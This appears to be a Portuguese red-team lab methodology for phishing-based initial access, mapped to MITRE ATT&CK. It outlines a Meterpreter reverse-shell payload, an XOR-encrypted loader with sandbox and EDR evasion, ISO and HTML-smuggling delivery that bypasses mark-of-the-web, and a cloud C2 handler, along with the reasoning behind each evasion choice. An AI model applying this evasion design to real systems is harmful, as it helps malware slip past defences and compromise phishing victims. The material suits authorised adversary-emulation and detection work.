
# Metodologia — Initial Access via Phishing (Lab)

Exercício autorizado em ambiente 100% laboratorial (rede isolada, VMs e hosts próprios).

## 1. Mapeamento MITRE ATT&CK

| # | Fase | Técnica | ID | Implementação |
|---|---|---|---|---|
| 1 | Resource Development | Obtain Capabilities: Malware | T1588.001 | msfvenom staged payload + loader customizado |
| 2 | Resource Development | Acquire Infrastructure: Server | T1583.004 | AWS EC2 (Ubuntu 24.04, Nginx, Let's Encrypt) |
| 3 | Resource Development | Domain Names | T1583.001 | Domínio registrado + WHOIS privacy |
| 4 | Initial Access | Phishing: Spear phishing Link | T1566.002 | E-mail do lab com link HTTPS rastreável |
| 5 | Execution | User Execution: Malicious File | T1204.002 | Vítima abre ISO e executa "catálogo" |
| 6 | Defense Evasion | HTML Smuggling | T1226.001* | Payload embutido em base64 no HTML, montado client-side |
| 7 | Defense Evasion | Subprocess/MOTW bypass | T1553.005 | Entrega em ISO — MOTW removido ao montar |
| 8 | Defense Evasion | Obfuscated Files or Information | T1027 | Rolling XOR + chave derivada FNV-1a em runtime |
| 9 | Defense Evasion | Virtualization/Sandbox Evasion | T1497 | Anti-VM por artefatos de driver, delay variável |
| 10 | Command and Control | Application Layer Protocol | T1071.001 | Meterpreter reverse_tcp (porta não-padrão 8443) |

*Nota: HTML smuggling é rastreado em T1226.001 em versões antigas da matriz;
correntemente classificado sob T1027 (obfuscation) + T1204 (user execution).

## 2. Pipeline técnico

```
[1] msfvenom -p windows/x64/meterpreter/reverse_tcp (staged, 509 bytes) ↓ 
[2] encrypt2.py — rolando XOR: data[i] ^= key[i % 32] ^ (i & 0xFF) chave: FNV-1a(seed) — seed NUNCA é a chave em si, derivada em runtime ↓ 
[3] veneno2.cpp — loader: - payload em recurso RCDATA (não na seção .data) - VirtualAlloc RW → memcpy → decrypt → VirtualProtect RX (nunca RWX) - execução via callback EnumFontsA (sem CreateThread) - ShellExecuteA do PDF real (distração + comportamento peculiar) - Sleep variável 12-17s (anti-fast-sandbox) ↓ 
[4] recurso.rc — ícone PDF + VERSIONINFO (metadados legítimos) build: x86_64-w64-mingw32-g++ (MinGW, -O2, -s, -mwindows) ↓ 
[5] genisoimage — ISO com PDF real + EXE (MOTW não se aplica a ISO montado) ↓
[6] generate_smuggling.py — HTML com ISO em base64, download client-side via Blob + (não passa por gateway de e-mail/AV estático) ↓ 
[7] AWS EC2 — Nginx + TLS Let's Encrypt + página servida via HTTPS URL rastreável: /?id=vitima_NN → log de cliques ↓ 
[8] handler Meterpreter na EC2 (screen, LHOST 0.0.0.0, LPORT 8443) [bloqueado]

```

## 3. Racional das decisões de evasion

| Decisão | Por quê |
|---|---|
| Chave derivada em runtime (FNV-1a) | XOR de chave constante é revertido por emulação do Defender |
| Rolling XOR (dependente da posição) | Quebra padrões de repetição de bloco constante |
| Recurso RCDATA em vez de array | Reduz entropia em seções de código; resource menos escaneado |
| RW → RX (nunca RWX) | RWX em memória é flag comportamental forte |
| Callback (EnumFonts) | CreateThread direto em shellcode é sequência assinada |
| Staged payload (509B) | Stage inicial pequeno, menos assinado que stageless |
| Porta 8443 para C2 | 4444 é a primeira porta que sensores monitoram |
| TLS + domínio dedicado | Remove warning de download inseguro do Chrome/Safe Browsing |

## 4. Escopo e ética

- Alvos: exclusivamente VMs/hosts do próprio lab (Debian 12, Win10 Acer/VBox)
- Sem coleta de dados de terceiros, sem persistência em máquinas reais
- IoCs documentados em `report/IOC.md` para fechamento do ciclo (função blue team)


